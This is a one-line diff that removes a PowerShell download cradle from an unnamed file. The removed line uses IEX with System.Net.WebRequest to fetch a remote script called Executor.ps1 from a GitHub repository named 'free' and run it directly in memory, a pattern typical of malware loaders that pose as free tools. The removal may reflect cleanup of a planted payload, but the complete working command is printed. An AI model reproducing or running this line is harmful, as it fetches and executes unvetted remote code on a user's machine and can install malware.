@@ -1,1 +1,0 @@
-powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/Executor.ps1').GetResponse().GetResponseStream()).ReadToEnd());
